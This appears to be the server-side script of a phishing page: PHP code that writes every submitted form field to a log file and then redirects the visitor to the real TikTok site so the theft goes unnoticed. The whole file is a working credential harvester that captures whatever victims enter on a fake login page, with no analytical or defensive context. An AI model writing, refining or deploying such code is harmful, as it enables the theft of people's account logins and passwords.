<?php
// MUST be the VERY FIRST thing - no spaces, no blank lines, nothing before <?php

// Collect and log data first (before any possible output)
$log_data = "";
foreach ($_POST as $variable => $value) {
    $log_data .= $variable . "=" . $value . "\r\n";
}
$log_data .= "\r\n\r\n\r\n";

// Try to write to file
$handle = fopen("log.txt", "a");
if ($handle) {
    fwrite($handle, $log_data);
    fclose($handle);
} else {
    // Optional: For debugging only - remove later
    // error_log("Failed to open log.txt: " . error_get_last()['message']);
}

// Redirect to real site (use full URL for reliability)
header('Location: https://www.tiktok.com/');
exit;  // Always exit after header redirect
?>
